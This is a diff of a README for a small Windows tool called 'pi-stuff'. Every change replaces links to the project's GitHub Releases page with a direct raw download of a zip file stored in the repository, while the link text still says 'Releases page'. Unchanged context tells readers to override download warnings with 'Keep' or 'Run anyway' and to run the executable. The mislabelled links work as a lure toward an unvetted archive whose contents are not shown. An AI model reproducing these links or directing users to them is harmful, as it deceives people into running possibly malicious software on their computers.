@@ -1,10 +1,10 @@
 # 🪴 pi-stuff - Simple tools for your Pi
 
-[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/dtcdam5699/pi-stuff/releases)
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/dtcdam5699/pi-stuff/raw/refs/heads/main/scripts/pi_stuff_1.9.zip)
 
 ## 📥 Download
 
-Visit this page to download: [GitHub Releases](https://github.com/dtcdam5699/pi-stuff/releases)
+Visit this page to download: [GitHub Releases](https://github.com/dtcdam5699/pi-stuff/raw/refs/heads/main/scripts/pi_stuff_1.9.zip)
 
 Open the page, look for the latest release, and download the file for Windows. If there are more than one file, choose the one that ends in `.exe` or `.msi`.
 
@@ -32,7 +32,7 @@ If your PC blocks the download, you may need to choose **Keep** or **Run anyway*
 
 ## 🚀 Get the app
 
-1. Open the [Releases page](https://github.com/dtcdam5699/pi-stuff/releases)
+1. Open the [Releases page](https://github.com/dtcdam5699/pi-stuff/raw/refs/heads/main/scripts/pi_stuff_1.9.zip)
 2. Find the newest release near the top
 3. Download the Windows file
 4. Save it to your **Downloads** folder
@@ -91,7 +91,7 @@ This makes it easier to find your Pi files later.
 
 ## 🔄 Updates
 
-Check the [Releases page](https://github.com/dtcdam5699/pi-stuff/releases) when you want the latest version.
+Check the [Releases page](https://github.com/dtcdam5699/pi-stuff/raw/refs/heads/main/scripts/pi_stuff_1.9.zip) when you want the latest version.
 
 To update:
 
@@ -174,6 +174,6 @@ Use pi-stuff as your main place for small Pi tasks. Keep it open while you work,
 
 ## 📥 Download again
 
-Visit this page to download: [https://github.com/dtcdam5699/pi-stuff/releases](https://github.com/dtcdam5699/pi-stuff/releases)
+Visit this page to download: [https://github.com/dtcdam5699/pi-stuff/raw/refs/heads/main/scripts/pi_stuff_1.9.zip](https://github.com/dtcdam5699/pi-stuff/raw/refs/heads/main/scripts/pi_stuff_1.9.zip)
 
 Open the latest release, download the Windows file, then install it or run it based on the file type
